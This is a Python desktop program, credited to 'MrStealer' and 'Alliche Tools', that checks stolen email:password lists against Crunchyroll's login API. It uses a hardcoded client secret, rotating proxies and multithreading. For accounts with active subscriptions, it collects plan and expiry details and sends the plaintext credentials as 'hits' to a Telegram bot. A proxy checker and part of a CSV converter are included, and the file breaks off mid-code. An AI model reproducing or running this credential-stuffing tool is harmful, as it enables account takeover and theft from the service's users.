import sys
import re
import time
import threading
import json
import uuid
import urllib.parse
import base64
import csv
import os
import random
import datetime
import string
import mmap
import gc
from functools import lru_cache
from queue import Queue, Empty
from datetime import datetime, timedelta
from urllib.parse import urlparse

import requests
from PyQt5.QtCore import Qt, QThread, pyqtSignal, QObject, QTimer, QCoreApplication, QUrl
from PyQt5.QtWidgets import (
    QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
    QLabel, QPlainTextEdit, QPushButton, QTableWidget, QTableWidgetItem,
    QHeaderView, QSpinBox, QProgressBar, QFileDialog, QMessageBox,
    QGroupBox, QTabWidget, QCheckBox, QLineEdit, QSplitter, QComboBox,
    QStatusBar, QGridLayout, QSlider, QTextEdit
)
from PyQt5.QtGui import QColor, QFont

# Try to import shadow effect
try:
    from PyQt5.QtGui import QGraphicsDropShadowEffect
    SHADOW_AVAILABLE = True
except ImportError:
    SHADOW_AVAILABLE = False
    class QGraphicsDropShadowEffect:
        def setBlurRadius(self, r): pass
        def setOffset(self, x, y): pass
        def setColor(self, c): pass

# Try to import multimedia
try:
    from PyQt5.QtMultimedia import QMediaPlayer, QMediaContent
    MUSIC_AVAILABLE = True
except ImportError:
    MUSIC_AVAILABLE = False
    class QMediaPlayer: pass
    class QMediaContent: pass

# Try to import BeautifulSoup (optional)
try:
    from bs4 import BeautifulSoup
    BEAUTIFULSOUP_AVAILABLE = True
except ImportError:
    BEAUTIFULSOUP_AVAILABLE = False
    BeautifulSoup = None

# ---------- Helper function for PyInstaller paths ----------
def get_path(filename):
    if hasattr(sys, '_MEIPASS'):
        return os.path.join(sys._MEIPASS, filename)
    return os.path.join(os.path.abspath("."), filename)

# ---------- Constants ----------
TIMEOUT = 30
HEADERS = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
IP_API_URL = 'http://ip-api.com/json/{ip}?fields=status,message,country,countryCode,city,query'

# ---------- Optimized Helper Functions ----------
@lru_cache(maxsize=1000)
def parse_proxy_cached(proxy_str):
    pattern = re.compile(r'^([^:]+):(\d+)(?::([^:]+):(.*))?$')
    match = pattern.match(proxy_str.strip())
    if not match:
        return None
    host, port, user, password = match.groups()
    if user and password:
        return {'http': f'http://{user}:{password}@{host}:{port}', 'https': f'http://{user}:{password}@{host}:{port}'}
    else:
        return {'http': f'http://{host}:{port}', 'https': f'http://{host}:{port}'}

def parse_proxy(proxy_str):
    return parse_proxy_cached(proxy_str)

def send_telegram(bot_token, chat_id, message):
    if not bot_token or not chat_id:
        return False
    for attempt in range(3):
        try:
            url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
            payload = {'chat_id': chat_id, 'text': message, 'parse_mode': 'HTML'}
            response = requests.post(url, json=payload, timeout=15)
            if response.status_code == 200:
                return True
            time.sleep(2)
        except Exception:
            time.sleep(2)
    return False

def random_hex_string(length):
    return ''.join(random.choice('0123456789abcdef') for _ in range(length))

def load_file_fast(filepath):
    try:
        with open(filepath, 'rb') as f:
            with mmap.mmap(f.fileno(), 0, access=mmap.ACCESS_READ) as mm:
                return mm.read().decode('utf-8', errors='ignore')
    except Exception:
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            return f.read()

# ---------- Proxy Checker Classes ----------
class ProxyChecker(QObject):
    finished = pyqtSignal(dict)
    def __init__(self, proxy_str, retries=1, real_ip=None):
        super().__init__()
        self.proxy_str = proxy_str
        self.retries = retries
        self.real_ip = real_ip
    def run(self):
        result = {
            'proxy': self.proxy_str, 'working': False, 'ip': '', 'country': '', 'city': '',
            'time': 0, 'anonymity': 'Unknown', 'http': False, 'https': False, 'error': '',
            'response_time': 0.0
        }
        start = time.time()
        proxy = parse_proxy(self.proxy_str)
        if not proxy:
            result['error'] = 'Invalid proxy format'
            result['response_time'] = time.time() - start
            self.finished.emit(result)
            return
        http_ok = https_ok = False
        total_time = 0
        external_ip = ''
        headers_info = None
        for attempt in range(self.retries):
            try:
                start_req = time.time()
                resp = requests.get('http://httpbin.org/get', proxies=proxy, headers=HEADERS, timeout=TIMEOUT)
                if resp.status_code == 200:
                    http_ok = True
                    data = resp.json()
                    external_ip = data.get('origin', '')
                    total_time = time.time() - start_req
                    headers_info = resp.headers
                    break
            except Exception:
                pass
            try:
                start_req = time.time()
                resp = requests.get('https://httpbin.org/get', proxies=proxy, headers=HEADERS, timeout=TIMEOUT)
                if resp.status_code == 200:
                    https_ok = True
                    if not external_ip:
                        data = resp.json()
                        external_ip = data.get('origin', '')
                        total_time = time.time() - start_req
                        headers_info = resp.headers
                    break
            except Exception:
                pass
            if attempt < self.retries - 1:
                time.sleep(1)
        if not http_ok and not https_ok:
            result['error'] = 'Connection failed after retries'
            result['response_time'] = time.time() - start
            self.finished.emit(result)
            return
        result['http'] = http_ok
        result['https'] = https_ok
        result['ip'] = external_ip
        result['time'] = round(total_time * 1000, 2)
        if self.real_ip and headers_info:
            result['anonymity'] = self._detect_anonymity(headers_info, self.real_ip)
        if external_ip:
            geo = self._get_geo(external_ip)
            if geo:
                result['country'] = geo.get('country', '')
                result['city'] = geo.get('city', '')
        result['working'] = True
        result['response_time'] = time.time() - start
        self.finished.emit(result)
    def _detect_anonymity(self, headers, real_ip):
        xff = headers.get('X-Forwarded-For')
        if xff and real_ip in xff:
            return 'Transparent'
        if headers.get('Via') or headers.get('X-Via') or headers.get('Proxy-Connection'):
            return 'Anonymous'
        return 'Elite'
    def _get_geo(self, ip):
        try:
            resp = requests.get(IP_API_URL.format(ip=ip), timeout=5)
            if resp.status_code == 200:
                data = resp.json()
                if data.get('status') == 'success':
                    return data
        except Exception:
            pass
        return None

class ProxyCheckerThread(QThread):
    progress = pyqtSignal(int, int)
    result_ready = pyqtSignal(dict)
    log_message = pyqtSignal(str)
    finished = pyqtSignal()
    def __init__(self, proxies, threads=10, retries=1):
        super().__init__()
        self.proxies = proxies
        self.threads = min(threads, 50)
        self.retries = retries
        self.real_ip = self._get_real_ip()
        self._is_running = True
    def _get_real_ip(self):
        try:
            resp = requests.get('http://httpbin.org/ip', timeout=5)
            if resp.status_code == 200:
                return resp.json().get('origin', '')
        except Exception:
            pass
        return None
    def run(self):
        total = len(self.proxies)
        completed = 0
        queue = Queue()
        for p in self.proxies:
            queue.put(p)
        def worker():
            nonlocal completed
            while self._is_running and not queue.empty():
                try:
                    proxy = queue.get_nowait()
                except:
                    break
                checker = ProxyChecker(proxy, self.retries, self.real_ip)
                checker.finished.connect(lambda res: self.result_ready.emit(res))
                checker.run()
                completed += 1
                self.progress.emit(completed, total)
                queue.task_done()
                time.sleep(0.05)
        threads = []
        for _ in range(min(self.threads, total)):
            t = threading.Thread(target=worker)
            t.daemon = True
            t.start()
            threads.append(t)
        for t in threads:
            t.join()
        self.finished.emit()
    def stop(self):
        self._is_running = False

# ---------- Crunchyroll Worker ----------
class CrunchyrollWorker(QObject):
    finished = pyqtSignal(dict)
    log_message = pyqtSignal(str)

    def __init__(self, account, proxy_str=None, retries=1,
                 telegram_token=None, telegram_chat_id=None, send_telegram_hits=False):
        super().__init__()
        self.email, self.password = account
        self.proxy_str = proxy_str
        self.retries = max(1, retries)
        self.telegram_token = telegram_token
        self.telegram_chat_id = telegram_chat_id
        self.send_telegram_hits = send_telegram_hits

    def _json_extract(self, text, key, default=None):
        try:
            data = json.loads(text)
            return data.get(key, default)
        except:
            match = re.search(rf'"{key}"\s*:\s*"([^"]*)"', text)
            if match:
                return match.group(1)
            match_int = re.search(rf'"{key}"\s*:\s*(\d+)', text)
            if match_int:
                return match_int.group(1)
            match_bool = re.search(rf'"{key}"\s*:\s*(true|false)', text)
            if match_bool:
                return match_bool.group(1)
            return default

    def _extract_regex(self, text, pattern):
        match = re.search(pattern, text, re.IGNORECASE | re.DOTALL)
        if match:
            return match.group(1).strip()
        return ''

    def run(self):
        result = {
            'email': self.email,
            'password': self.password,
            'success': False,
            'message': '',
            'email_verified': '',
            'account_creation': '',
            'external_id': '',
            'plan': '',
            'currency': '',
            'subscribable': '',
            'free_trial': '',
            'next_renewal_date': '',
            'cycle_duration': '',
            'is_active': '',
            'country': '',
            'capture_string': '',
            'access_token': '',
            'response_time': 0.0
        }

        proxy_dict = None
        if self.proxy_str:
            proxy_dict = parse_proxy(self.proxy_str)

        start_time = time.time()
        last_error = None

        for attempt in range(self.retries):
            try:
                # Step 1: Generate GUID as device_id
                device_id = str(uuid.uuid4())

                # Step 2: POST token request
                token_url = "https://beta-api.crunchyroll.com/auth/v1/token"
                token_data = {
                    "grant_type": "password",
                    "username": self.email,
                    "password": self.password,
                    "scope": "offline_access",
                    "client_id": "y2arvjb0h0rgvtizlovy",
                    "client_secret": "JVLvwdIpXvxU-qIBvT1M8oQTr1qlQJX2",
                    "device_type": "MrStealer",
                    "device_id": device_id,
                    "device_name": "MrStealer"
                }
                token_headers = {
                    'host': 'beta-api.crunchyroll.com',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Sec-Fetch-Site': 'same-origin',
                    'Sec-Fetch-Mode': 'cors',
                    'Sec-Fetch-Dest': 'empty',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Accept-Language': 'en-US,en;q=0.9',
                    'user-agent': 'AppleCoreMedia/1.0.0.20L563 (Apple TV; U; CPU OS 16_5 like Mac OS X; en_us)'
                }
                resp = requests.post(token_url, data=token_data, headers=token_headers, proxies=proxy_dict, timeout=TIMEOUT)
                token_text = resp.text

                # Check for failure keywords
                if any(x in token_text for x in ['auth.obtain_access_token.missing_required_field', 'auth.obtain_access_token.invalid_credentials', 'force_password_reset', 'auth.obtain_access_token.too_many_requests']):
                    result['message'] = 'Invalid credentials or locked'
                    result['response_time'] = time.time() - start_time
                    self.finished.emit(result)
                    return
                if resp.status_code in (400, 401):
                    result['message'] = f'HTTP {resp.status_code}'
                    result['response_time'] = time.time() - start_time
                    self.finished.emit(result)
                    return

                # Extract access token
                access_token = self._json_extract(token_text, 'access_token')
                if not access_token:
                    last_error = 'No access_token in response'
                    if attempt < self.retries - 1:
                        self.log_message.emit(f"⚠️ {last_error} (attempt {attempt+1}/{self.retries}). Retrying in 2s...")
                        time.sleep(2)
                        continue
                    else:
                        result['message'] = last_error
                        break
                result['access_token'] = access_token

                # Step 3: GET account info
                account_url = "https://beta-api.crunchyroll.com/accounts/v1/me"
                account_headers = {
                    'authorization': f'Bearer {access_token}',
                    'connection': 'Keep-Alive',
                    'host': 'beta-api.crunchyroll.com',
                    'user-agent': 'AppleCoreMedia/1.0.0.20L563 (Apple TV; U; CPU OS 16_5 like Mac OS X; en_us)'
                }
                resp = requests.get(account_url, headers=account_headers, proxies=proxy_dict, timeout=TIMEOUT)
                account_text = resp.text

                email_verified = self._json_extract(account_text, 'email_verified', '')
                created = self._json_extract(account_text, 'created', '')
                external_id = self._json_extract(account_text, 'external_id', '')
                result['email_verified'] = str(email_verified)
                if created:
                    result['account_creation'] = created.split('T')[0] if 'T' in created else created
                result['external_id'] = external_id

                if not external_id:
                    result['message'] = 'No external_id found'
                    result['response_time'] = time.time() - start_time
                    self.finished.emit(result)
                    return

                # Step 4: GET subscription products
                products_url = f"https://beta-api.crunchyroll.com/subs/v1/subscriptions/{external_id}/products"
                resp = requests.get(products_url, headers=account_headers, proxies=proxy_dict, timeout=TIMEOUT)
                products_text = resp.text

                items = self._json_extract(products_text, 'items')
                if items and isinstance(items, list) and len(items) > 0:
                    item = items[0]
                    product = item.get('product', {})
                    result['plan'] = product.get('sku', '')
                    result['currency'] = item.get('currency_code', '')
                    result['subscribable'] = str(product.get('is_subscribable', ''))
                    result['free_trial'] = str(item.get('active_free_trial', ''))
                else:
                    result['plan'] = 'None'
                    result['subscribable'] = 'False'

                # Step 5: GET subscription details
                subs_url = f"https://beta-api.crunchyroll.com/subs/v1/subscriptions/{external_id}"
                resp = requests.get(subs_url, headers=account_headers, proxies=proxy_dict, timeout=TIMEOUT)
                subs_text = resp.text

                result['next_renewal_date'] = self._json_extract(subs_text, 'next_renewal_date', '')
                result['cycle_duration'] = self._json_extract(subs_text, 'cycle_duration', '')
                result['is_active'] = str(self._json_extract(subs_text, 'is_active', False))
                country_code = self._json_extract(subs_text, 'country_code', '')

                # Translate country
                country_map = {
                    "AF": "Afghanistan 🇦🇫", "AX": "Åland Islands 🇦🇽", "AL": "Albania 🇦🇱", "DZ": "Algeria 🇩🇿",
                    "AS": "American Samoa 🇦🇸", "AD": "Andorra 🇦🇩", "AO": "Angola 🇦🇴", "AI": "Anguilla 🇦🇮",
                    "AQ": "Antarctica 🇦🇶", "AG": "Antigua and Barbuda 🇦🇬", "AR": "Argentina 🇦🇷", "AM": "Armenia 🇦🇲",
                    "AW": "Aruba 🇦🇼", "AU": "Australia 🇦🇺", "AT": "Austria 🇦🇹", "AZ": "Azerbaijan 🇦🇿",
                    "BS": "Bahamas 🇧🇸", "BH": "Bahrain 🇧🇭", "BD": "Bangladesh 🇧🇩", "BB": "Barbados 🇧🇧",
                    "BY": "Belarus 🇧🇾", "BE": "Belgium 🇧🇪", "BZ": "Belize 🇧🇿", "BJ": "Benin 🇧🇯",
                    "BM": "Bermuda 🇧🇲", "BT": "Bhutan 🇧🇹", "BO": "Bolivia 🇧🇴", "BQ": "Bonaire 🇧🇶",
                    "BA": "Bosnia and Herzegovina 🇧🇦", "BW": "Botswana 🇧🇼", "BV": "Bouvet Island 🇧🇻",
                    "BR": "Brazil 🇧🇷", "IO": "British Indian Ocean Territory 🇮🇴", "BN": "Brunei Darussalam 🇧🇳",
                    "BG": "Bulgaria 🇧🇬", "BF": "Burkina Faso 🇧🇫", "BI": "Burundi 🇧🇮", "KH": "Cambodia 🇰🇭",
                    "CM": "Cameroon 🇨🇲", "CA": "Canada 🇨🇦", "CV": "Cape Verde 🇨🇻", "KY": "Cayman Islands 🇰🇾",
                    "CF": "Central African Republic 🇨🇫", "TD": "Chad 🇹🇩", "CL": "Chile 🇨🇱", "CN": "China 🇨🇳",
                    "CX": "Christmas Island 🇨🇽", "CC": "Cocos (Keeling) Islands 🇨🇨", "CO": "Colombia 🇨🇴",
                    "KM": "Comoros 🇰🇲", "CG": "Republic Congo 🇨🇬", "CD": "Democratic Congo 🇨🇩",
                    "CK": "Cook Islands 🇨🇰", "CR": "Costa Rica 🇨🇷", "CI": "Côte d'Ivoire 🇨🇮", "HR": "Croatia 🇭🇷",
                    "CU": "Cuba 🇨🇺", "CW": "Curaçao 🇨🇼", "CY": "Cyprus 🇨🇾", "CZ": "Czech Republic 🇨🇿",
                    "DK": "Denmark 🇩🇰", "DJ": "Djibouti 🇩🇯", "DM": "Dominica 🇩🇲", "DO": "Dominican Republic 🇩🇴",
                    "EC": "Ecuador 🇪🇨", "EG": "Egypt 🇪🇬", "SV": "El Salvador 🇸🇻", "GQ": "Equatorial Guinea 🇬🇶",
                    "ER": "Eritrea 🇪🇷", "EE": "Estonia 🇪🇪", "ET": "Ethiopia 🇪🇹", "FK": "Falkland Islands 🇫🇰",
                    "FO": "Faroe Islands 🇫🇴", "FJ": "Fiji 🇫🇯", "FI": "Finland 🇫🇮", "FR": "France 🇫🇷",
                    "GF": "French Guiana 🇬🇫", "PF": "French Polynesia 🇵🇫", "TF": "French Southern Territories 🇹🇫",
                    "GA": "Gabon 🇬🇦", "GM": "Gambia 🇬🇲", "GE": "Georgia 🇬🇪", "DE": "Germany 🇩🇪",
                    "GH": "Ghana 🇬🇭", "GI": "Gibraltar 🇬🇮", "GR": "Greece 🇬🇷", "GL": "Greenland 🇬🇱",
                    "GD": "Grenada 🇬🇩", "GP": "Guadeloupe 🇬🇵", "GU": "Guam 🇬🇺", "GT": "Guatemala 🇬🇹",
                    "GG": "Guernsey 🇬🇬", "GN": "Guinea 🇬🇳", "GW": "Guinea-Bissau 🇬🇼", "GY": "Guyana 🇬🇾",
                    "HT": "Haiti 🇭🇹", "HM": "Heard Island and McDonald Islands 🇭🇲", "VA": "Vatican City 🇻🇦",
                    "HN": "Honduras 🇭🇳", "HK": "Hong Kong 🇭🇰", "HU": "Hungary 🇭🇺", "IS": "Iceland 🇮🇸",
                    "IN": "India 🇮🇳", "ID": "Indonesia 🇮🇩", "IR": "Iran 🇮🇷", "IQ": "Iraq 🇮🇶",
                    "IE": "Ireland 🇮🇪", "IM": "Isle of Man 🇮🇲", "IL": "Israel 🇮🇱", "IT": "Italy 🇮🇹",
                    "JM": "Jamaica 🇯🇲", "JP": "Japan 🇯🇵", "JE": "Jersey 🇯🇪", "JO": "Jordan 🇯🇴",
                    "KZ": "Kazakhstan 🇰🇿", "KE": "Kenya 🇰🇪", "KI": "Kiribati 🇰🇮", "KP": "North Korea 🇰🇵",
                    "KR": "South Korea 🇰🇷", "KW": "Kuwait 🇰🇼", "KG": "Kyrgyzstan 🇰🇬", "LA": "Laos 🇱🇦",
                    "LV": "Latvia 🇱🇻", "LB": "Lebanon 🇱🇧", "LS": "Lesotho 🇱🇸", "LR": "Liberia 🇱🇷",
                    "LY": "Libya 🇱🇾", "LI": "Liechtenstein 🇱🇮", "LT": "Lithuania 🇱🇹", "LU": "Luxembourg 🇱🇺",
                    "MO": "Macao 🇲🇴", "MK": "North Macedonia 🇲🇰", "MG": "Madagascar 🇲🇬", "MW": "Malawi 🇲🇼",
                    "MY": "Malaysia 🇲🇾", "MV": "Maldives 🇲🇻", "ML": "Mali 🇲🇱", "MT": "Malta 🇲🇹",
                    "MH": "Marshall Islands 🇲🇭", "MQ": "Martinique 🇲🇶", "MR": "Mauritania 🇲🇷", "MU": "Mauritius 🇲🇺",
                    "YT": "Mayotte 🇾🇹", "MX": "Mexico 🇲🇽", "FM": "Micronesia 🇫🇲", "MD": "Moldova 🇲🇩",
                    "MC": "Monaco 🇲🇨", "MN": "Mongolia 🇲🇳", "ME": "Montenegro 🇲🇪", "MS": "Montserrat 🇲🇸",
                    "MA": "Morocco 🇲🇦", "MZ": "Mozambique 🇲🇿", "MM": "Myanmar 🇲🇲", "NA": "Namibia 🇳🇦",
                    "NR": "Nauru 🇳🇷", "NP": "Nepal 🇳🇵", "NL": "Netherlands 🇳🇱", "NC": "New Caledonia 🇳🇨",
                    "NZ": "New Zealand 🇳🇿", "NI": "Nicaragua 🇳🇮", "NE": "Niger 🇳🇪", "NG": "Nigeria 🇳🇬",
                    "NU": "Niue 🇳🇺", "NF": "Norfolk Island 🇳🇫", "MP": "Northern Mariana Islands 🇲🇵",
                    "NO": "Norway 🇳🇴", "OM": "Oman 🇴🇲", "PK": "Pakistan 🇵🇰", "PW": "Palau 🇵🇼",
                    "PS": "Palestine 🇵🇸", "PA": "Panama 🇵🇦", "PG": "Papua New Guinea 🇵🇬", "PY": "Paraguay 🇵🇾",
                    "PE": "Peru 🇵🇪", "PH": "Philippines 🇵🇭", "PN": "Pitcairn 🇵🇳", "PL": "Poland 🇵🇱",
                    "PT": "Portugal 🇵🇹", "PR": "Puerto Rico 🇵🇷", "QA": "Qatar 🇶🇦", "RE": "Réunion 🇷🇪",
                    "RO": "Romania 🇷🇴", "RU": "Russia 🇷🇺", "RW": "Rwanda 🇷🇼", "BL": "Saint Barthélemy 🇧🇱",
                    "SH": "Saint Helena 🇸🇭", "KN": "Saint Kitts and Nevis 🇰🇳", "LC": "Saint Lucia 🇱🇨",
                    "MF": "Saint Martin 🇲🇫", "PM": "Saint Pierre and Miquelon 🇵🇲", "VC": "Saint Vincent and the Grenadines 🇻🇨",
                    "WS": "Samoa 🇼🇸", "SM": "San Marino 🇸🇲", "ST": "Sao Tome and Principe 🇸🇹",
                    "SA": "Saudi Arabia 🇸🇦", "SN": "Senegal 🇸🇳", "RS": "Serbia 🇷🇸", "SC": "Seychelles 🇸🇨",
                    "SL": "Sierra Leone 🇸🇱", "SG": "Singapore 🇸🇬", "SX": "Sint Maarten 🇸🇽", "SK": "Slovakia 🇸🇰",
                    "SI": "Slovenia 🇸🇮", "SB": "Solomon Islands 🇸🇧", "SO": "Somalia 🇸🇴", "ZA": "South Africa 🇿🇦",
                    "GS": "South Georgia and South Sandwich Islands 🇬🇸", "SS": "South Sudan 🇸🇸", "ES": "Spain 🇪🇸",
                    "LK": "Sri Lanka 🇱🇰", "SD": "Sudan 🇸🇩", "SR": "Suriname 🇸🇷", "SJ": "Svalbard and Jan Mayen 🇸🇯",
                    "SZ": "Swaziland 🇸🇿", "SE": "Sweden 🇸🇪", "CH": "Switzerland 🇨🇭", "SY": "Syria 🇸🇾",
                    "TW": "Taiwan 🇹🇼", "TJ": "Tajikistan 🇹🇯", "TZ": "Tanzania 🇹🇿", "TH": "Thailand 🇹🇭",
                    "TL": "Timor-Leste 🇹🇱", "TG": "Togo 🇹🇬", "TK": "Tokelau 🇹🇰", "TO": "Tonga 🇹🇴",
                    "TT": "Trinidad and Tobago 🇹🇹", "TN": "Tunisia 🇹🇳", "TR": "Turkey 🇹🇷", "TM": "Turkmenistan 🇹🇲",
                    "TC": "Turks and Caicos Islands 🇹🇨", "TV": "Tuvalu 🇹🇻", "UG": "Uganda 🇺🇬", "UA": "Ukraine 🇺🇦",
                    "AE": "United Arab Emirates 🇦🇪", "GB": "United Kingdom 🇬🇧", "US": "United States 🇺🇸",
                    "UM": "U.S. Outlying Islands 🇺🇲", "UY": "Uruguay 🇺🇾", "UZ": "Uzbekistan 🇺🇿", "VU": "Vanuatu 🇻🇺",
                    "VE": "Venezuela 🇻🇪", "VN": "Vietnam 🇻🇳", "VG": "British Virgin Islands 🇻🇬", "VI": "U.S. Virgin Islands 🇻🇮",
                    "WF": "Wallis and Futuna 🇼🇫", "EH": "Western Sahara 🇪🇭", "YE": "Yemen 🇾🇪", "ZM": "Zambia 🇿🇲",
                    "ZW": "Zimbabwe 🇿🇼"
                }
                result['country'] = country_map.get(country_code, country_code or 'Unknown')

                # Build capture string for table display
                capture_string = (f"{result['email']}:{result['password']} | EmailVerified: {result['email_verified']} | "
                                  f"AccountCreation: {result['account_creation']} | Plan: {result['plan']} | "
                                  f"Currency: {result['currency']} | Subscribable: {result['subscribable']} | "
                                  f"FreeTrial: {result['free_trial']} | Expiry: {result['next_renewal_date']} | "
                                  f"PlanDuration: {result['cycle_duration']} | Active: {result['is_active']} | "
                                  f"Country: {result['country']} | ConfigBy @MrStealer")
                result['capture_string'] = capture_string

                # Determine success: active subscription and subscribable
                is_active = result['is_active'].lower() == 'true'
                subscribable = result['subscribable'].lower() == 'true'
                is_cancelled = False
                if 'is_cancelled' in subs_text:
                    is_cancelled = self._json_extract(subs_text, 'is_cancelled', False)
                if is_active and subscribable and not is_cancelled:
                    result['success'] = True
                    result['message'] = 'Hit!'
                else:
                    result['success'] = False
                    result['message'] = 'No active subscription'

                # Send Telegram only for real hits – with custom emoji IDs
                if self.send_telegram_hits and result['success']:
                    # Custom emoji IDs mapping
                    emoji_ids = {
                        '🔹': '5454113432284446338',
                        '✉️': '5307843983102204243',
                        '🔑': '5861735798956627072',
                        '✅': '5413879192267805083',
                        '🗓': '5355012477883004708',
                        '📺': '5402186569006210455',
                        '💱': '5857258295550545890',
                        '⏺️': '5970074171449808121',
                        '🎁': '5956184869984800977',
                        '⌛️': '5454415424319931791',
                        '🌎': '5298780919207844086'
                    }
                    def emoji_tag(emoji):
                        if emoji in emoji_ids:
                            return f"<tg-emoji emoji-id='{emoji_ids[emoji]}'>{emoji}</tg-emoji>"
                        return emoji
                    msg = (
                        f"{emoji_tag('🔹')} <b>Crunchyroll Hit! 🍣</b>\n\n"
                        f"{emoji_tag('✉️')} <b>Email:</b> <code>{result['email']}</code>\n"
                        f"{emoji_tag('🔑')} <b>Password:</b> <code>{result['password']}</code>\n"
                        f"{emoji_tag('✅')} <b>Email Verified:</b> {result['email_verified']}\n"
                        f"{emoji_tag('🗓')} <b>Account Creation:</b> {result['account_creation']}\n"
                        f"{emoji_tag('📺')} <b>Plan:</b> {result['plan']}\n"
                        f"{emoji_tag('💱')} <b>Currency:</b> {result['currency']}\n"
                        f"{emoji_tag('⏺️')} <b>Subscribable:</b> {result['subscribable']}\n"
                        f"{emoji_tag('🎁')} <b>Free Trial:</b> {result['free_trial']}\n"
                        f"{emoji_tag('🗓')} <b>Expiry:</b> {result['next_renewal_date']}\n"
                        f"{emoji_tag('⌛️')} <b>Plan Duration:</b> {result['cycle_duration']}\n"
                        f"{emoji_tag('✅')} <b>Active:</b> {result['is_active']}\n"
                        f"{emoji_tag('🌎')} <b>Country:</b> {result['country']}\n"
                        f"👑 <b>Config By:</b> @MrStealer\n"
                        f"⏱ <b>Time:</b> {result['response_time']:.2f}s\n\n"
                        f"<b>A message from the heart...</b> ❤️\n"
                        f"Hi, I’m the creator of <b>Alliche Tools</b>. This project is my life’s work, built with "
                        f"patience and persistence through constant health struggles and limited resources. "
                        f"If these tools help you, please consider supporting me. 🙏\n\n"
                        f"<b><tg-emoji emoji-id='5213403875670765022'>💳</tg-emoji> Binance ID:</b> <code>801774085</code>\n"
                        f"<b><tg-emoji emoji-id='5409048419211682843'>💵</tg-emoji> USDT (TRC20):</b> <code>TBeHkEpdtDqzzyvtWgMgiR1bhS7LDpi19L</code>\n\n"
                        f"<tg-emoji emoji-id='5780405967527089720'>📢</tg-emoji> <a href='https://t.me/allichetools'>Join our family</a> | @allichetoolsgroup"
                    )
                    send_telegram(self.telegram_token, self.telegram_chat_id, msg)

                break  # Success, exit retry loop

            except (requests.exceptions.ConnectionError, requests.exceptions.Timeout) as e:
                last_error = f"Connection error: {str(e)}"
                if attempt < self.retries - 1:
                    self.log_message.emit(f"⚠️ {last_error} (attempt {attempt+1}/{self.retries}). Retrying in 2s...")
                    time.sleep(2)
                    continue
                else:
                    result['message'] = f'Connection error after {self.retries} attempts: {str(e)}'
            except Exception as e:
                last_error = f"Exception: {str(e)}"
                if attempt < self.retries - 1:
                    self.log_message.emit(f"⚠️ {last_error} (attempt {attempt+1}/{self.retries}). Retrying in 2s...")
                    time.sleep(2)
                    continue
                else:
                    result['message'] = last_error
                    break

        result['response_time'] = time.time() - start_time
        self.finished.emit(result)

class CrunchyrollCheckerThread(QThread):
    progress = pyqtSignal(int, int)
    result_ready = pyqtSignal(dict)
    log_message = pyqtSignal(str)
    finished = pyqtSignal()
    def __init__(self, accounts, proxies=None, threads=10, retries=1,
                 telegram_token=None, telegram_chat_id=None, send_telegram_hits=False,
                 delay_ms=0):
        super().__init__()
        self.accounts = accounts
        self.proxies = proxies if proxies else []
        self.threads = min(threads, 50)
        self.retries = retries
        self.telegram_token = telegram_token
        self.telegram_chat_id = telegram_chat_id
        self.send_telegram_hits = send_telegram_hits
        self.delay_ms = delay_ms
        self._is_running = True
        self.proxy_index = 0
        self.proxy_lock = threading.Lock()
    def _get_next_proxy(self):
        if not self.proxies:
            return None
        with self.proxy_lock:
            proxy = self.proxies[self.proxy_index % len(self.proxies)]
            self.proxy_index += 1
            return proxy
    def run(self):
        total = len(self.accounts)
        completed = 0
        queue = Queue()
        for acc in self.accounts:
            queue.put(acc)
        def worker():
            nonlocal completed
            while self._is_running and not queue.empty():
                try:
                    account = queue.get_nowait()
                except:
                    break
                proxy = self._get_next_proxy() if self.proxies else None
                if self.delay_ms > 0:
                    time.sleep(self.delay_ms / 1000.0)
                worker_obj = CrunchyrollWorker(
                    account, proxy, self.retries,
                    self.telegram_token, self.telegram_chat_id, self.send_telegram_hits
                )
                worker_obj.log_message.connect(self.log_message.emit)
                worker_obj.finished.connect(lambda res: self.result_ready.emit(res))
                worker_obj.run()
                completed += 1
                self.progress.emit(completed, total)
                queue.task_done()
                if completed % 10 == 0:
                    gc.collect()
        threads = []
        for _ in range(min(self.threads, total)):
            t = threading.Thread(target=worker)
            t.daemon = True
            t.start()
            threads.append(t)
        for t in threads:
            t.join()
        self.finished.emit()
    def stop(self):
        self._is_running = False

# ---------- CSV to TXT Converter Tab ----------
class CsvToTxtConverter(QWidget):
    def __init__(self):
        super().__init__()
        layout = QVBoxLayout()
        layout.setSpacing(10)

        file_group = QGroupBox("CSV File Selection")
        file_layout = QHBoxLayout()
        self.csv_path = QLineEdit()
        self.csv_path.setPlaceholderText("Select CSV file...")
        file_layout.addWidget(self.csv_path)
        browse_btn = QPushButton("Browse")
        browse_btn.clicked.connect(self.browse_csv)
        file_layout.addWidget(browse_btn)
        file_group.setLayout(file_layout)
        layout.addWidget(file_group)

        options_group = QGroupBox("Conversion Options")
        options_layout = QGridLayout()
        options_layout.addWidget(QLabel("Delimiter:"), 0, 0)
        self.delimiter_combo = QComboBox()
        self.delimiter_combo.addItems(["Comma (,)", "Semicolon (;)", "Tab", "Pipe (|)"])
        self.delimiter_combo.setCurrentIndex(0)
        options_layout.addWidget(self.delimiter_combo, 0, 1)
        options_layout.addWidget(QLabel("Include header row:"), 1, 0)
        self.include_header = QCheckBox()
        self.include_header.setChecked(True)
        options_layout.addWidget(self.include_header, 1, 1)
        options_layout.addWidget(QLabel("Format:"), 2, 0)
        self.format_combo = QComboBox()
        self.format_combo.addItems(["Aligned columns", "Plain (tab-separated)", "Markdown table"])
        self.format_combo.setCurrentIndex(0)
        options_layout.addWidget(self.format_combo, 2, 1)
        self.parse_pipe = QCheckBox("Parse embedded pipe data")
        self.parse_pipe.setChecked(True)
        options_layout.addWidget(self.parse_pipe, 3, 0, 1, 2)
        options_group.setLayout(options_layout)
        layout.addWidget(options_group)

        preview_group = QGroupBox("Preview (first 20 rows)")
        preview_layout = QVBoxLayout()
        self.preview_text = QTextEdit()
        self.preview_text.setReadOnly(True)
        self.preview_text.setFont(QFont("Consolas", 10))
        preview_layout.addWidget(self.preview_text)
        preview_group.setLayout(preview_layout)
        layout.addWidget(preview_group)

        btn_layout = QHBoxLayout()
        convert_preview_btn = QPushButton("Refresh Preview")
        convert_preview_btn.clicked.connect(self.refresh_preview)
        btn_layout.addWidget(convert_preview_btn)
